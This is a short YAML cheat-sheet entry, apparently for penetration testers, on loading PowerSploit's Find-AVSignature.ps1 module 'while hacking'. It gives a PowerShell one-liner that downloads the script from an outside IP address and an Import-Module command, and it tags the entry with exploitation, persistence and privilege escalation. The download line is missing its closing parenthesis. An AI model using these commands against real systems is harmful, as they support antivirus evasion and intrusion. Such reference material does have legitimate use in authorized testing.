---
description: |
  Command to import Powershell module into the current session. Useful to make use of Powersploit scripts while hacking.

  Command Reference:
  ```
  Module: Find-AVSignature.ps1
  ```
command: |
  Import-Module .\Find-AVSignature.ps1

code: |
  (New-Object Net.WebClient).DownloadFile('http://172.16.240.178:80/Find-AVSignature.ps1', 'Find-AVSignature.ps1' 

items:
  - Shell
services:
  - AV
  - LDAP
OS:
  - Windows
attack_types:
  - Enumeration
  - Exploitation
  - Persistence
  - PrivEsc
  - General
  - Injection

references:
  - https://powersploit.readthedocs.io/en/latest/
  - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/import-module?view=powershell-7.3
---